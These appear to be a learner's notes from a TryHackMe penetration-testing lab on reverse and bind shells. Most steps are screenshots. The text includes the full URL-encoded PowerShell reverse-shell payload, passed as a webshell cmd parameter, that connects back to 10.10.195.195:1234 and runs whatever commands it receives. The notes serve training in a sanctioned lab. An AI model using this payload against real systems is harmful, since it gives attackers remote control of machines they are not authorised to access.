![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image19.png?raw=true)

Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image20.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image21.png?raw=true)

Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image22.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image23.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image24.png?raw=true)

Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image25.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image26.png?raw=true)

Thêm vào url:

    ?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.195.195%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image27.png?raw=true)

→ không được

Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.































